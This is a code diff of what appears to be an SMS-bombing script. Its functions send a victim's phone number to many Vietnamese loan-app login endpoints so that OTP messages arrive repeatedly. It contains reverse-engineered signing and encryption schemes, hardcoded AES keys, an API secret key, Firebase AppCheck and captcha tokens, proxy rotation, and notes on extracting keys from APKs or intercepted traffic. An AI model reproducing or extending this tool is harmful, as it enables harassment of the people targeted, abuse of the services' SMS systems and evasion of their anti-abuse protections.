-        print(f"[NganNgan] ERR {type(e).__name__}: {e}")
-        return False
-
-
-# ══════════════════════════════════════════════════════════════════════════════
-# NHÓM 6 — FINVUITECH AES-ECB
-# ══════════════════════════════════════════════════════════════════════════════
-
-_FinVui_KEY = b"r3gk088TfheCv47F"
-
-
-def _finvui_enc(obj, key: bytes) -> str:
-    if isinstance(obj, (dict, list)):
-        obj = json.dumps(obj, separators=(",", ":"), ensure_ascii=False)
-    ct = AES.new(key, AES.MODE_ECB).encrypt(pad(obj.encode(), 16))
-    return base64.b64encode(ct).decode()
-
-
-def _finvui_dec(ct_b64: str, key: bytes):
-    raw = AES.new(key, AES.MODE_ECB).decrypt(base64.b64decode(ct_b64))
-    text = unpad(raw, 16).decode()
-    try:
-        return json.loads(text)
-    except Exception:
-        return text
-
-
-async def Call_FinVuiTeck(phone):
-    mobile = "84" + phone.lstrip("0") if phone.startswith("0") else phone
-    body_plain = {"businessType": "login", "channelType": "1", "mobile": mobile}
-    short_path = "/api/code/sendCode"
-    try:
-        async with _make_client(timeout=20) as client:
-            r = await client.post(
-                "https://api.finvuitech.com/fapi/u21w1id1sjw27hq7e2780rm9c8mjqh2d",
-                headers={
-                    "Content-Type": "application/json",
-                    "Accept": "application/json",
-                    "Origin": "http://h5.finvuitech.com",
-                    "Referer": "http://h5.finvuitech.com/",
-                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-                    "Accept-Language": "vi-VN,vi;q=0.9",
-                    "gutjqidj": _finvui_enc(short_path, _FinVui_KEY),
-                    "yxshibrd": "2", "h5-version": "1.2.1",
-                    "nshjghxq": "105", "cojjaqbq": "14",
-                    "ncycfrss": "h5123456789", "isvpfpui": "FV",
-                    "fzwdwroz": "", "version": "1.0.0",
-                    "deviceId": "", "x-language": "vn", "appLanguage": "vn",
-                },
-                content=_finvui_enc(body_plain, _FinVui_KEY),
-            )
-        try:
-            resp = _finvui_dec(r.text, _FinVui_KEY)
-            if isinstance(resp, dict):
-                ok = str(resp.get("code", "")) in ("0", "200") or resp.get("success") is True
-                if ok:
-                    print(f"[FinVuiTeck] ✅ OK")
-                else:
-                    print(f"[FinVuiTeck] ❌ {resp.get('message') or resp.get('msg') or r.text[:100]}")
-            else:
-                ok = r.status_code == 200
-                print(f"[FinVuiTeck] {'✅ OK' if ok else f'❌ HTTP {r.status_code}: {r.text[:100]}'}")
-        except Exception:
-            ok = r.status_code == 200
-            print(f"[FinVuiTeck] {'✅ OK' if ok else f'❌ HTTP {r.status_code}'}")
-        return ok
-    except Exception as e:
-        print(f"[FinVuiTeck] ERR {type(e).__name__}: {e}")
-        return False
 
 
 _BANANA_RSA_PUB = RSA.import_key(
@@ -1930,7 +1587,7 @@ async def _banana_send(
         }
 
     event_url = f"{origin}/app-domain/api/burying/unauthenticated/event"
-    _client_kw: dict[str, Any] = dict(follow_redirects=True, verify=False)
+    _client_kw: dict[str, Any] = dict(follow_redirects=True, )
     if use_proxy:
         _client_kw["proxy"] = _current_proxy()
     else:
@@ -1963,11 +1620,8 @@ async def _banana_send(
             msg = dec.get("message") or dec.get("msg") or ""
         except Exception:
             ok = r.status_code == 200
-            msg = r.text[:80]
-        if ok:
-            print(f"[{label}] ✅ OK")
-        else:
-            print(f"[{label}] ❌ {msg}")
+            msg = str(r.status_code)
+        print(f"  [{label}] {'✓' if ok else '✗'} {phone}  {msg}")
         return ok
     except Exception as e:
         print(f"[{label}] ERR {type(e).__name__}: {e}")
@@ -1977,20 +1631,17 @@ async def _banana_send(
 _HEDGYV_API = "https://api.hedgyv.com"
 _HEDGYV_H5  = "http://h5.hedgyv.com"
 
-# RSA public key của app com.hedgyv.loan (lấy từ APK / traffic intercept)
-# Server Go dùng crypto/rsa để DECRYPT body — client phải ENCRYPT bằng key này
-# Điền key vào đây sau khi extract từ APK:
-#   unzip hedgyv.apk → grep -r "MII" assets/ hoặc strings lib/*.so
 _HEDGYV_RSA_PUBKEY_B64 = (
-    ""  # TODO: paste base64 public key (PKCS#8 hoặc PKCS#1) tại đây
+    ""  # TODO: paste base64 public key (PKCS#8 hoc PKCS#1) ti y
 )
 
 _HEDGYV_HEADERS = {
     "Accept": "application/json, text/plain, */*",
     "Content-Type": "application/json",
-    "language": "vi_vn",
+    "language": "vi_VN",   # capital N  t nuttyv/hedgyv JS
     "appType": "1",
-    "osType": "1",
+    "osType": "h5",        # JS: reactive({phone:"",smsCode:"",osType:"h5"})
+    "client": "ios",       # t nuttyv H5 header pattern
     "Origin": _HEDGYV_H5,
     "Referer": _HEDGYV_H5 + "/",
     "User-Agent": "okhttp/4.9.0",
@@ -2000,10 +1651,10 @@ _HEDGYV_HEADERS = {
 
 def _hedgyv_rsa_encrypt(body_dict: dict) -> str:
     """
-    Encrypt JSON body bằng RSA public key của hedgyv.
-    Server Go dùng rsa.DecryptPKCS1v15 để decrypt field "key" trong body JSON.
-    Format gửi lên: {"key": "<base64_rsa_ciphertext>"}
-    Output: base64 string của RSA ciphertext (để wrap vào {"key": ...}).
+    Encrypt JSON body bng RSA public key ca hedgyv.
+    Server Go dng rsa.DecryptPKCS1v15  decrypt field "key" trong body JSON.
+    Format gi ln: {"key": "<base64_rsa_ciphertext>"}
+    Output: base64 string ca RSA ciphertext ( wrap vo {"key": ...}).
     """
     raw_json = json.dumps(body_dict, separators=(",", ":"), ensure_ascii=False)
     key_der = base64.b64decode(_HEDGYV_RSA_PUBKEY_B64)
@@ -2014,28 +1665,24 @@ def _hedgyv_rsa_encrypt(body_dict: dict) -> str:
 
 
 async def Call_Hedgyv(phone: str) -> bool:
-    if phone.startswith("+84"):
-        phone = "0" + phone[3:]
-    elif phone.startswith("84") and len(phone) == 11:
-        phone = "0" + phone[2:]
-
     if not _HEDGYV_RSA_PUBKEY_B64:
-        print("[Hedgyv] SKIP — chưa có RSA public key (lấy từ APK com.hedgyv.loan)")
+        print("[Hedgyv] SKIP  cha c RSA public key (ly t APK com.hedgyv.loan)")
         return False
 
     try:
+        # SMS OTP body  t hedgyv JS: {smsType:"1", phone:k.phone, loanProductName:v}
         sms_enc = _hedgyv_rsa_encrypt({
             "smsType": "1",
             "phone": phone,
             "loanProductName": "hedgy",
         })
+        # Burying event  t hedgyv JS: appBuryingPoint({type:1, productName:..., channelCode:...})
         burying_enc = _hedgyv_rsa_encrypt({
-            "eventKey": "LOGIN_SMS",
-            "packageName": "hedgy",
-            "phone": phone,
+            "type": 1,
+            "productName": "hedgy",
         })
 
-        async with _make_client(follow_redirects=True, verify=False) as client:
+        async with _make_client(follow_redirects=True, ) as client:
             try:
                 await client.post(
                     f"{_HEDGYV_API}/burying/unauthenticated/event",
@@ -2053,11 +1700,11 @@ async def Call_Hedgyv(phone: str) -> bool:
                 timeout=20,
             )
 
-        print(f"[Hedgyv] {phone} → {r.status_code} | {r.text[:120]}")
+        print(f"[Hedgyv] {phone}  {r.status_code} | ")
         if r.status_code == 200:
             try:
                 d = r.json()
-                return str(d.get("code", "")) in ("0", "1", "200") or d.get("ok")
+                return d.get("code") == 1 or str(d.get("code", "")) in ("0", "200") or d.get("ok")
             except Exception:
                 return True
         return False
@@ -2069,8 +1716,7 @@ async def Call_Hedgyv(phone: str) -> bool:
 
 async def sentSms1(phone):
     return await _banana_send(
-        phone, "http://www.moneymua.top/app-domain/api/user/sentSms", "Money_Mua", "moneymua",
-        use_proxy=False,
+        phone, "http://www.moneymua.top/app-domain/api/user/sentSms", "Money_Mua", "moneymua"
     )
 
 
@@ -2080,126 +1726,197 @@ async def sentSms_FvBanana(phone):
     )
 
 
-# ── Tien24h ──
-_T24H_BASE = "https://api.tien-24h.com"
-_T24H_L = hashlib.md5(b"tien24hh5").hexdigest()
-_T24H_HEADERS = {
-    "Accept": "application/json, text/plain, */*",
-    "Content-Type": "application/json",
-    "platform": "h5", "app-version": "1.0.0", "lang": "vi_VN",
-    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-    "Origin": "https://h5.tien-24h.com", "Referer": "https://h5.tien-24h.com/",
-    "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
-    "Accept-Language": "vi-VN,vi;q=0.9", "Accept-Encoding": "gzip, deflate, br",
-}
+async def Call_ViHeo(phone):
+    """
+    ViHeo H5 – sign formula giống GhiNhanh/Calcvay:
+      sign = MD5(MD5(appCode) *|* secret *|* body_sorted *|* ts)
+    """
+    BASE     = "https://api.vi-heo.com"
+    APP_CODE = "viheo"
+    VERSION  = "none"
 
-# ── Tien24h Pro ──
-_T24HPRO_BASE = "https://api.tien-24h.com"
-_T24HPRO_L = hashlib.md5(b"tien24hpro").hexdigest()
-_T24HPRO_HEADERS = {
-    "Accept": "application/json, text/plain, */*",
-    "Content-Type": "application/json",
-    "platform": "h5", "app-version": "1.0.0", "lang": "vi_VN",
-    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
-    "Origin": "https://www.tien24hpro.com", "Referer": "https://www.tien24hpro.com/",
-    "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
-    "Accept-Language": "vi-VN,vi;q=0.9", "Accept-Encoding": "gzip, deflate, br",
-}
+    h1 = {
+        "Accept":       "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "platform":     "h5",
+        "app-version":  VERSION,
+        "lang":         "vi_VN",
+    }
 
+    def _yr(obj):
+        if obj is None:
+            return obj
+        if isinstance(obj, list):
+            return [_yr(x) for x in obj]
+        if isinstance(obj, dict):
+            return {k: _yr(obj[k]) for k in sorted(obj.keys())}
+        return obj
 
-def _t24h_yr(obj):
-    if isinstance(obj, dict):
-        return {k: _t24h_yr(obj[k]) for k in sorted(obj.keys())}
-    return obj
-
-
-async def Call_ConCac27(phone):
-    appcheck_tok = _load_appcheck_token("tien24h")
-    if not appcheck_tok:
-        return False
-    body = {"appCode": "tien24hh5", "version": "1.0.0", "mobileType": "1", "phone": phone}
     try:
-        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
+        async with _make_client(timeout=15) as client:
             rs = await client.get(
-                f"{_T24H_BASE}/api/user/app/common/secret",
-                headers=_T24H_HEADERS,
-                params={"appCode": "tien24hh5", "version": "1.0.0", "mobileType": "1"},
+                f"{BASE}/api/user/app/common/secret",
+                params={"appCode": APP_CODE, "mobileType": "2", "version": VERSION},
+                headers=h1,
             )
-            secret = ""
-            if rs.status_code == 200:
-                secret = (rs.json().get("data") or {}).get("verifySignSecret", "")
-            jsessionid = rs.cookies.get("JSESSIONID", "")
-            if not jsessionid:
-                import re as _re
-                m = _re.search(r"JSESSIONID=([^;]+)", rs.headers.get("set-cookie", ""))
-                if m:
-                    jsessionid = m.group(1)
-            ts = int(time.time() * 1000)
-            sorted_body = json.dumps(_t24h_yr(body), separators=(",", ":"))
-            sign = hashlib.md5(f"{_T24H_L}*|*{secret}*|*{sorted_body}*|*{ts}".encode()).hexdigest()
-            r = await client.post(
-                f"{_T24H_BASE}/api/user/app/login/sms",
-                headers={
-                    **_T24H_HEADERS,
-                    "X-Firebase-AppCheck": appcheck_tok,
-                    "sign": sign,
-                    "timestamp": str(ts),
-                    "Cookie": f"JSESSIONID={jsessionid}",
-                },
-                json=body,
+            d1 = rs.json() if rs.status_code == 200 else {}
+            secret = (d1.get("data") or {}).get("verifySignSecret", "")
+            if not secret:
+                print(f"[ViHeo] Không lấy được secret: {d1}")
+                return False
+
+            body = {
+                "appCode":    APP_CODE,
+                "version":    VERSION,
+                "mobileType": "2",
+                "phone":      phone,
+            }
+            app_md5     = hashlib.md5(APP_CODE.encode()).hexdigest()
+            ts          = int(time.time() * 1000)
+            body_sorted = json.dumps(_yr(body), separators=(",", ":"))
+            sign = hashlib.md5(
+                f"{app_md5}*|*{secret}*|*{body_sorted}*|*{ts}".encode()
+            ).hexdigest().lower()
+
+            post_hdrs = {**h1, "timestamp": str(ts), "sign": sign}
+            r2 = await client.post(
+                f"{BASE}/api/user/app/login/sms", headers=post_hdrs, json=body,
             )
-            try:
-                d = r.json()
-                return d.get("code") == 200 or d.get("data") is True
-            except Exception:
-                return r.status_code == 200
+            d2 = r2.json() if r2.status_code == 200 else {}
+            ok = d2.get("code") == 200 or d2.get("data") is True
+            if ok:
+                print(f"  [ViHeo] ✓ {phone}")
+            else:
+                print(f"  [ViHeo] ✗ {phone}  {d2.get('message') or r2.status_code}")
+            return ok
     except Exception as e:
-        print(f"[Tien24h] ERR {type(e).__name__}: {e}")
+        print(f"[ViHeo] ERR {type(e).__name__}: {e}")
         return False
 
 
-async def Call_Tien24hPro(phone):
-    appcheck_tok = _load_appcheck_token("tien24hpro")
-    if not appcheck_tok:
-        return False
-    body = {"appCode": "tien24hpro", "version": "1.0.0", "mobileType": "1", "phone": phone}
+async def sentSms_DuoVay(phone):
+    """DuoVay – banana RSA+AES pattern, giống FvBanana/MoneyMua."""
+    return await _banana_send(
+        phone, "https://www.duovay.top/app-domain/api/user/sentSms", "Duoc_Vay", "duovay"
+    )
+
+
+async def Call_Calcvay(phone):
+    """
+    Calcvay H5 – sign formula giống GhiNhanh:
+      sign = MD5(MD5(appCode) *|* secret *|* body_sorted *|* ts)
+    Bước 1: GET secret từ /api/user/app/common/secret
+    Bước 2: POST /api/user/app/login/sms với sign + timestamp
+    """
+    BASE     = "https://api.calcvay.com"
+    APP_CODE = "calcvay"
+    VERSION  = "none"
+
+    h1 = {
+        "Accept":       "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "platform":     "h5",
+        "app-version":  VERSION,
+        "lang":         "en",
+    }
+
+    def _yr(obj):
+        if obj is None:
+            return obj
+        if isinstance(obj, list):
+            return [_yr(x) for x in obj]
+        if isinstance(obj, dict):
+            return {k: _yr(obj[k]) for k in sorted(obj.keys())}
+        return obj
+
     try:
-        async with _make_client(timeout=30, proxy=_current_proxy()) as client:
+        async with _make_client(timeout=15) as client:
             rs = await client.get(
-                f"{_T24HPRO_BASE}/api/user/app/common/secret",
-                headers=_T24HPRO_HEADERS,
-                params={"appCode": "tien24hpro", "version": "1.0.0", "mobileType": "1"},
+                f"{BASE}/api/user/app/common/secret",
+                params={"appCode": APP_CODE, "mobileType": "2", "version": VERSION},
+                headers=h1,
             )
-            secret = ""
-            if rs.status_code == 200:
-                secret = (rs.json().get("data") or {}).get("verifySignSecret", "")
-            jsessionid = rs.cookies.get("JSESSIONID", "")
-            if not jsessionid:
-                import re as _re
-                m = _re.search(r"JSESSIONID=([^;]+)", rs.headers.get("set-cookie", ""))
-                if m:
-                    jsessionid = m.group(1)
-            ts = int(time.time() * 1000)
-            sorted_body = json.dumps(_t24h_yr(body), separators=(",", ":"))
-            sign = hashlib.md5(f"{_T24HPRO_L}*|*{secret}*|*{sorted_body}*|*{ts}".encode()).hexdigest()
-            r = await client.post(
-                f"{_T24HPRO_BASE}/api/user/app/login/sms",
-                headers={
-                    **_T24HPRO_HEADERS,
-                    "X-Firebase-AppCheck": appcheck_tok,
-                    "sign": sign,
-                    "timestamp": str(ts),
-                    "Cookie": f"JSESSIONID={jsessionid}",
-                },
-                json=body,
+            d1 = rs.json() if rs.status_code == 200 else {}
+            secret = (d1.get("data") or {}).get("verifySignSecret", "")
+            if not secret:
+                print(f"[Calcvay] Không lấy được secret: {d1}")
+                return False
+
+            body = {
+                "appCode":    APP_CODE,
+                "version":    VERSION,
+                "mobileType": "2",
+                "phone":      phone,
+            }
+            app_md5    = hashlib.md5(APP_CODE.encode()).hexdigest()
+            ts         = int(time.time() * 1000)
+            body_sorted = json.dumps(_yr(body), separators=(",", ":"))
+            sign = hashlib.md5(
+                f"{app_md5}*|*{secret}*|*{body_sorted}*|*{ts}".encode()
+            ).hexdigest().lower()
+
+            post_hdrs = {**h1, "timestamp": str(ts), "sign": sign}
+            r2 = await client.post(
+                f"{BASE}/api/user/app/login/sms", headers=post_hdrs, json=body,
             )
-            try:
-                d = r.json()
-                return d.get("code") == 200 or d.get("data") is True
-            except Exception:
-                return r.status_code == 200
+            d2 = r2.json() if r2.status_code == 200 else {}
+            ok = d2.get("code") == 200 or d2.get("data") is True
+            if ok:
+                print(f"  [Calcvay] ✓ {phone}")
+            else:
+                print(f"  [Calcvay] ✗ {phone}  {d2.get('message') or r2.status_code}")
+            return ok
     except Exception as e:
-        print(f"[Tien24hPro] ERR {type(e).__name__}: {e}")
+        print(f"[Calcvay] ERR {type(e).__name__}: {e}")
+        return False
+
+async def Call_GhiNhanh_H5(phone):
+    """GhiNhanh H5 platform (mobileType=1)  sign formula ging app nhng khc mobileType."""
+    BASE = "https://api.ghinhanh.com"
+    appcheck_tok = _load_appcheck_token("ghinhanh")
+    h1 = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "platform": "h5", "app-version": "1.0.2", "lang": "vi_VN",
+    }
+
+    def _yr(obj):
+        if obj is None: return obj
+        if isinstance(obj, list): return [_yr(x) for x in obj]
+        if isinstance(obj, dict): return {k: _yr(obj[k]) for k in sorted(obj.keys())}
+        return obj
+
+    try:
+        async with _make_client(timeout=15) as client:
+            rs = await client.get(
+                f"{BASE}/api/user/app/common/secret",
+                params={"appCode": "ghinhanh", "mobileType": "1", "version": "1.0.2"},
+                headers=h1,
+            )
+            d1 = rs.json() if rs.status_code == 200 else {}
+            secret = (d1.get("data") or {}).get("verifySignSecret", "")
+            if not secret:
+                return False
+            body = {"appCode": "ghinhanh", "mobileType": "1", "phone": phone, "version": "1.0.2"}
+            app_md5 = hashlib.md5(b"ghinhanh").hexdigest()
+            ts = int(time.time() * 1000)
+            body_sorted = json.dumps(_yr(body), separators=(",", ":"))
+            sign = hashlib.md5(f"{app_md5}*|*{secret}*|*{body_sorted}*|*{ts}".encode()).hexdigest().lower()
+            post_hdrs = {**h1, "timestamp": str(ts), "sign": sign}
+            if appcheck_tok:
+                post_hdrs["X-Firebase-AppCheck"] = appcheck_tok
+            r2 = await client.post(
+                f"{BASE}/api/user/app/login/sms", headers=post_hdrs, json=body,
+            )
+            d2 = r2.json() if r2.status_code == 200 else {}
+            ok = d2.get("code") == 200 or d2.get("data") is True
+            if ok:
+                print(f"  [GhiNhanh-H5] {phone}")
+            else:
+                print(f"  [GhiNhanh-H5] {phone}  {d2.get('message') or r2.status_code}")
+            return ok
+    except Exception as e:
+        print(f"[GhiNhanh-H5] ERR {type(e).__name__}: {e}")
         return False
 
 
@@ -2222,7 +1939,7 @@ async def Call_GhiNhanh(phone):
         return obj
 
     try:
-        async with _make_client(timeout=15, verify=False, proxy=_current_proxy()) as client:
+        async with _make_client(timeout=15, ) as client:
             rs = await client.get(
                 f"{BASE}/api/user/app/common/secret",
                 params={"appCode": "ghinhanh", "mobileType": "2", "version": "1.0.2"},
@@ -2269,152 +1986,30 @@ async def Call_TuiTien(phone):
             "appCode": "tuitien", "phone": phone, "version": "1.0.1",
             "phoneMark": str(uuid.uuid4()).upper(), "mobileType": 1, "smsType": 1,
         }
-        async with _make_client(verify=False, timeout=20, proxy=_current_proxy()) as client:
+        async with _make_client(timeout=20) as client:
             r = await client.post(
                 "https://api.tui-tien.com/api/user/app/login/sms",
                 headers=headers, json=body,
             )
         try:
             d = r.json()
-            ok = d.get("code") in (0, 200, "0", "200") or d.get("success") is True
+            ok = d.get("code") == 200 or d.get("data") is True
         except Exception:
             ok = r.status_code == 200
-        print(f"[TuiTien] {r.status_code} | {r.text[:120]}")
         return ok
     except Exception as e:
         print(f"[TuiTien] ERR {type(e).__name__}: {e}")
         return False
 
 
-# ── Izion24 (Firebase AppCheck + x-secret-key) ──
-_IZION24_API        = "https://api.izion24.com.vn"
-_IZION24_SECRET_KEY = "vKqflXfgd9KGuj2UYnkwVhX4C2s2yn"
-
-_IZION24_FIXED_APPCHECK = (
-    "eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9."
-    "eyJzdWIiOiIxOjc2NTA5OTM0MTUyNDppb3M6YWQwZjA2YjAxZDczZTIzYjI3MmQ0MSIsImF1ZCI6WyJwcm9qZWN0cy83NjUwOTkzNDE1MjQiLCJwcm9qZWN0cy9pemlvbjI0Il0sInByb3ZpZGVyIjoiZGV2aWNlX2NoZWNrX2FwcF9hdHRlc3QiLCJpc3MiOiJodHRwczovL2ZpcmViYXNlYXBwY2hlY2suZ29vZ2xlYXBpcy5jb20vNzY1MDk5MzQxNTI0IiwiZXhwIjoxNzgzOTQxMTQ3LCJpYXQiOjE3ODM5Mzc1NDcsImp0aSI6InFUUkhsbEF1Ul9PX3o2VTBsaF9VazFpRHVsQmdJaFR5bmJjT3Q2d2k2MVkifQ."
-    "VqU4AdgSJA_u9eyrccezWh8ZkuG1uAeGx2DsoFI3JUuWXTkWOtjmUWWyZ90ffwsrIud5TmQaXJWaorvZ34s5NQSGuba7uhj7EBzxvJW5aI6YtzDg2EfeysElU9A0c-cYVqCiublwXNHjRwO5zWTEIl-cT7LlmMqelQRiVGcFJ1Se_pWXYiodtO3w9NM_PQvoa6fMr0muuGMTfERL1mpaoQ1Nkkcw1dBXskNZpgCMljtOnXHNuib8-fvKpWMKw8E802rCt2weC1ewrO-lxCjm9ZO4v19KhzZLq5b19SNUEUpJpgrYW_TaniYN2GK8gYzmT2TaqfXLtEWadObJ4xQD6y0FeyF65g9Alm_uYvPgcX_cS4KsOies6c_9JWRdJvcz-ieH0Iv2dRX1pJu50q8EgPMDXGuk8--qvupaIo2iWNnz_3EknzDuXvknitW7Yx1YrKWVp8Bh5O_4SUfwJ2VBHKUhiD9kEH_K79VaiSlvpaNb5qFxk8AABNIL8r8gMxH6"
-)
-
-
-def _izion24_headers(device_id: str, ua_suffix: str) -> dict:
-    return {
-        "Content-Type": "application/json",
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Accept-Language": "vi-VN,vi;q=0.9",
-        "Connection": "keep-alive",
-        "x-secret-key": _IZION24_SECRET_KEY,
-        "User-Agent": f"Izion24/ios-1.0.199.206-{device_id}-iPhone13,3-{ua_suffix}",
-    }
-
-
-def _izion24_token_valid(tok: str) -> bool:
-    try:
-        import base64 as _b64, json as _j
-        parts = tok.split('.')
-        pad = parts[1] + '=' * (4 - len(parts[1]) % 4)
-        data = _j.loads(_b64.b64decode(pad))
-        return data.get('exp', 0) > time.time()
-    except Exception:
-        return False
-
-
-async def _izion24_send(phone: str, voice_provider: str, is_resend: bool, ua_suffix: str, label: str) -> bool:
-    appcheck_tok = _IZION24_FIXED_APPCHECK
-    if not _izion24_token_valid(appcheck_tok):
-        print(f"[{label}] SKIP — AppCheck token đã hết hạn, cần lấy token mới từ thiết bị iOS (intercept x-firebase-appcheck)")
-        return False
-    device_id = str(uuid.uuid4()).upper()
-    phone_fmt = phone if phone.startswith("+84") else ("+84" + phone.lstrip("0"))
-    headers = _izion24_headers(device_id, ua_suffix)
-    headers["x-firebase-appcheck"] = appcheck_tok
-    body = {
-        "mobileNumber": phone_fmt,
-        "voiceProvider": voice_provider,
-        "isOtpResend": is_resend,
-        "language": "vi",
-        "deviceId": device_id,
-        "isConsentChecked": True,
-    }
-    try:
-        async with _make_client(timeout=20, proxy=_current_proxy()) as client:
-            r = await client.post(
-                f"{_IZION24_API}/auth/generate-otp",
-                headers=headers,
-                json=body,
-            )
-        print(f"[{label}] {r.status_code} | {r.text[:120]}")
-        return r.status_code == 200
-    except Exception as e:
-        print(f"[{label}] ERR {type(e).__name__}: {e}")
-        return False
-
-
-async def Call_Izion24_SMS(phone):
-    return await _izion24_send(phone, "sms", False, "LogIn", "Izion24-SMS")
-
-
-async def Call_Izion24_Voice(phone):
-    return await _izion24_send(phone, "smartbot", True, "LogInOTP", "Izion24-Voice")
 
 
 _GT365_CAPTCHA_REGISTER = (
-    "0cAFcWeA5V0KKBR1dhsWQqK2M6YSWs9FjusR55_7wn9quvFPGuNvvLPNfZ2tFm8syPqwNhlhN7IwOmRYVVgaubs3SAsoHnCzVS79G7YKk"
-    "L8e394Nda1yQohnRzt7SC7CN_C5MO5xUKcYNB9J9wnX4jA9l2BJeApy3NzAZA5ygsUeAKaj6lr3Gii7NtZEn814yoWTLOxCnPzTsmvWIDa"
-    "_OhRkZbQqqxGPUVIk574DDxPBd2biM-LvbczoVLMuIh97Vd8ac3Cy5PQ95hPfkx7Fd2CxG_lVK9ipnwli3cJuO10w9_-zZlRv5Ikc-08f"
-    "RsnJ1qRHU1hDRqz2ll284qOiGFOWqP8XDeRXEvkzf3MD9_udwGmTDhPQnX6_rWE7L03q1XGJf_K0ILdxuG0gBJS_R1Tpfxvr9B4UmkI_Y"
-    "OJZHY2JWW2jbbXQ_2TqJ5ZKjbhEu0QJcr7Pgm4jTR8YlUv-D6PjsiAJd8CTmEzy0FG0xzTx-f1a1K5MPsRcxbTbGu24WTvrcX6lq4WsXY"
-    "dGotfi_amW4x4UbiGObjrxl_iltc5Gaoo5vBzevalidkxC2m0sIVSWV3JkaQTFgnmWZD550eMGOE9gHwPj744cl4evNU0kWEl-OMDXrd8GW"
-    "dz_h_bQuSgIYJCjvsquZSL0b3org-QekrfpoRWMcWbDUlpR05rOZjnLZLN1t3VN_qn44-hQJI9oHZCh3-f4sxvKSSFLXgjQd-i55b-2NOi"
-    "pWaysGpATOuWNTuHJk6GPe88tXtJc05UcfDhe2MgBaz-IzWsuX0SwIpSsAKUAG8yiAFH9W1xj64mvEHIS1V1GKcXXoOMYYHT0HUVC8Rat5"
-    "PBAwI5wu4NdGK3WSiy9DTeJ0UuQVCZt4RHP5XwmSXva1gkGEun-VQqNE4QrY6TQtBcL3PZO8I6znN6JVc00fquT85FAbXCE1XhHYjgO6e"
-    "sWAMbHQXDRxBLA7IT_t7xfk3jn7yxVSfTIdEw0EMnQzl-xLJItcaUTErFKgql338xkvdwchWZT7dqz2vhQB1J9Isy5dCvagOocPgh0wHY"
-    "K6QHXI7_36N1pnMN4T-O5AAOY4VMxONh8DPKVAWOUuavwP498De1DqX8pPRcAqAyGP5JTslaHPvOZ6M3ZAM8rVdakW90mowyrFiMulnjn"
-    "Jb_qovVYS7ogdcmqhUPXZWFeMOfOXI6GPAL71W3p5A9YOGBqdVBI27pxTE0PbTfqC9wIJ8iDXV2y0AsRFI7wGXf1a73BlpBEWx158Y8Gy"
-    "d9-itgb3A25pNHIy7Xc4pf2EpnPjiQKy4Ti30BjML4MWNhEExMlLOyOuFiAIlchaBZVEim7GFOhB65ZIgzOS-MU5FNJGYEU9NDA6YbJ6M"
-    "8W8RrthHo440s4oJP7P_DxD6CbnGJwARlF9d8lSXeRvvRUI6e_8GK2M_PlMNEEgsJ-fKc3jPdpeY5CpU9p-BDJWv-EPKoHjPkiEiqZKkH"
-    "4r6P5764Ry5cd1uLB2Wshrso_xBqUr0A33c9mIF7sGR7o2dLrXvBRKgiVImWaCtKSHEGLV8_fmeyjXqjNbtquscLYqQMo5oeez7St56kUK"
-    "9Mxl27zMPiMBqtr6QXakuuHFehHqW0e1RJaseIktPESIKq6fKP8ATUYT2X2ZXv5IFdnj-wSljPEMNQlaabwrkEs99UjopZXOajzl-kMZgn"
-    "CxgcoHQs6CcKhlW3L9lQYDMg0UtswFq1m1a0ED5KI6HJfb0nFN3HAcuQFo1SZGtwVZXbbxoAzde_36CMis2rDz99My0vnX4ozdcNN0vk13"
-    "2rfKG5_uc0L_AbaeXIbe-Fc6x9hSl4gvMDqGjzC8jbQt-NbG6nQpqZeJtkzdcVHPSzgebuE5jtTFAfXr92n9jTMwMZEsGnP-UruYExC7t"
-    "uKwUBzOK01LjjTNgR3SMO3OjfginYJhSSnoplGG2b8rUhuJRXQC7x6K9lnxuILGZtj0EOTUTRHdiJmR_CXaj5U-fvZbB7zWJvn3N8fWBQ"
-    "dJhZqz0_xNCLDg_ZDVFoUBYugnHdHZ-Kb9jbh5iNliIm9X6VoGAquBYaflmGvp3Da-auS1Izr4pRsmop5TvO-L0SgyBUUhXp9q5g8K7_y"
-    "s-WcechwMe8q2sqqGzKOqD7NJ6VayVS6h0c253_yOe7lFNHKkNGx1NtKU-Rl1UppRaHctQabDLXVhopmoiczePW-i82nc51EDLQE2XNm9O"
-    "ZE4ebAc1FVSd46Reocj-TeyWw0kQoUd8c_BQaDZpTDDCTKvxwqA9HHXWTx8X1n0_Mrboqs2rtyFNS_tUfdxfn1h9FiyKCnh-m5HSSErYo"
-    "onqsEYEh2E3TTg-u2h6rOnda0098oLo_0d8zJGCtWW9nolKWY17ihDYp4-45gTW3k8-UIGxbN0WanZmxUmeb509D-bqRJbNwbmTa7Yd4GX"
-    "q5uIVyUjOFj6CeA2soktM78gfnZKy_2F0bCF1ZLHK9zcZDJwar0C2t0LywmVgIm5YudMXcbQ3GUiT9qycrenPxo8UZBuHFhR3cHdFLRdY"
-    "0h6ADlzYmQ9iaHmVBawuhRA"
